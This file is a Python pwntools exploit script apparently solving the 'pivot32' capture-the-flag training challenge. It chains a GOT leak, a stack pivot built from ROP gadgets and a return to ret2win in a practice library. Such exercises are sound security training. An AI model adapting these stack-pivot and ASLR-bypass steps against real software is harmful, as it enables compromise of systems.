#!/usr/bin/python

from pwn import *

s = process('./pivot32')

s.recvuntil('a place to pivot: ')
place_to_pivot = s.recvline(False)
place_to_pivot = int(place_to_pivot,16)
log.success("place_to_pivot = " + hex(place_to_pivot))
s.clean()

# 0x080488c0: pop eax ; ret  ; 
pop_eax = 0x80488c0
# 0x080488c2: xchg eax, esp ; ret 
xchg_eax_esp = 0x80488c2

pivot_stack = p32(pop_eax)
pivot_stack += p32(place_to_pivot)
pivot_stack += p32(xchg_eax_esp)

puts_plt = 0x80485d0
main = 0x804873b
foothold_function_plt = 0x80485f0
foothold_function_got = 0x804a024

elf = ELF('./libpivot32.so')
ret2win_offset = elf.sym['ret2win']   # 0x967
log.success("ret2win_offset = " + hex(ret2win_offset))
foothold_function_offset = elf.sym['foothold_function']   # 0x770
log.success("foothold_function_offset = " + hex(foothold_function_offset))

# func needs to be called atleast once to be able to leak it's real address
leak_foothold_function_addr = p32(foothold_function_plt) 
leak_foothold_function_addr += p32(puts_plt)
leak_foothold_function_addr += p32(main)
leak_foothold_function_addr += p32(foothold_function_got)

payload1 = leak_foothold_function_addr
payload1 += 'A' * (299 - len(payload1))
payload1 += pivot_stack

'''
context.terminal = ["terminator", "-e"]
gdb.attach(s,
"""
b * main
b * pwnme+174
""")
'''

s.sendline(payload1)

s.recvuntil('libpivot.so')
leak = s.recvline(False)
foothold_function = u32(leak[0:4])
log.success("foothold_function_addr = " + hex(foothold_function))

libpivot32 = foothold_function - foothold_function_offset
ret2win = libpivot32 + ret2win_offset

payload2 = 'A' * 299
payload2 += p32(ret2win)

s.sendline(payload2)
s.interactive()

























